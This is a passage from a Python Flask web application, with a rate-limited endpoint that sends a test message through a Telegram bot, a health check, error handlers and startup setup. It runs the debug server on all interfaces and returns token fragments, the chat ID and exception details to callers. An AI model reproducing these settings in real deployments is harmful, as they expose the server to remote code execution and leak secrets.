        response = requests.post(url, data={'chat_id': chat_id, 'text': message}, timeout=10)
        
        return f"Status: {response.status_code}, Response: {response.text}"
        
    except Exception as e:
        return f"Error: {str(e)}"

@app.route('/test-telegram')
@limiter.limit("2 per minute")
def test_telegram():
    """Test Telegram bot connection"""
    try:
        bot_token = config('BOT_TOKEN', default=None)
        chat_id = config('CHAT_ID', default=None)
        
        logger.info(f"🧪 Testing Telegram connection...")
        logger.info(f"BOT_TOKEN: {bot_token[:10] + '...' if bot_token and len(bot_token) > 10 else bot_token}")
        logger.info(f"CHAT_ID: {chat_id}")
        
        if not bot_token or bot_token == 'your-telegram-bot-token-here':
            error_msg = 'BOT_TOKEN not properly configured in .env file'
            logger.error(f"❌ {error_msg}")
            return jsonify({'error': error_msg}), 400
            
        if not chat_id or chat_id == 'your-telegram-chat-id-here':
            error_msg = 'CHAT_ID not properly configured in .env file'
            logger.error(f"❌ {error_msg}")
            return jsonify({'error': error_msg}), 400
            
        # Test message
        test_message = f"""🧪 TELEGRAM TEST MESSAGE
📅 {datetime.now().strftime("%Y-%m-%d %H:%M:%S")}
✅ Connection working!
🤖 Bot Token: {bot_token[:10]}...
💬 Chat ID: {chat_id}"""
        
        url = f"https://api.telegram.org/bot{bot_token}/sendMessage"
        
        logger.info(f"📤 Sending test message to: {url}")
        
        response = requests.post(
            url,
            data={
                'chat_id': chat_id,
                'text': test_message
            },
            timeout=15
        )
        
        logger.info(f"📨 Response Status: {response.status_code}")
        logger.info(f"📨 Response Text: {response.text}")
        
        if response.status_code == 200:
            logger.info("✅ Test message sent successfully!")
            return jsonify({
                'success': True,
                'message': 'Test message sent to Telegram successfully!',
                'bot_token_preview': f"{bot_token[:10]}...",
                'chat_id': chat_id,
                'response': response.json()
            })
        else:
            error_msg = f"Failed to send test message: {response.text}"
            logger.error(f"❌ {error_msg}")
            return jsonify({
                'success': False,
                'error': error_msg,
                'status_code': response.status_code,
                'bot_token_preview': f"{bot_token[:10]}...",
                'chat_id': chat_id
            }), 400
            
    except Exception as e:
        error_msg = f"Exception during Telegram test: {str(e)}"
        logger.error(f"❌ {error_msg}")
        import traceback
        logger.error(traceback.format_exc())
        return jsonify({'success': False, 'error': error_msg}), 500

@app.route('/health')
def health_check():
    """Health check endpoint"""
    try:
        # Test database connection
        from sqlalchemy import text
        db.session.execute(text('SELECT 1'))
        db_status = 'OK'
    except Exception as e:
        db_status = f'Error: {str(e)}'
    
    # Test session storage
    try:
        if redis_client:
            redis_client.ping()
            storage_status = 'Redis: OK'
        else:
            # Check if filesystem session directory exists
            import os
            if os.path.exists('./flask_session'):
                storage_status = 'Filesystem: OK'
            else:
                storage_status = 'Filesystem: Directory missing'
    except Exception as e:
        storage_status = f'Error: {str(e)}'
    
    return jsonify({
        'status': 'healthy',
        'database': db_status,
        'session_storage': storage_status,
        'timestamp': datetime.utcnow().isoformat()
    })

@app.errorhandler(429)
def ratelimit_handler(e):
    flash('Rate limit exceeded. Please try again later.', 'error')
    return render_template('index.html', error='Rate limit exceeded'), 429

@app.errorhandler(500)
def internal_error(error):
    logger.error(f"Internal server error: {error}")
    db.session.rollback()
    flash('An internal error occurred. Please try again.', 'error')
    return render_template('index.html', error='Internal server error'), 500

# Ensure required directories exist
required_dirs = ['logs', 'cookies', 'flask_session']
for directory in required_dirs:
    if not os.path.exists(directory):
        os.makedirs(directory)
        logger.info(f"Created directory: {directory}")

# Initialize database
with app.app_context():
    db.create_all()
    logger.info("Database tables created successfully")

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000, debug=True)
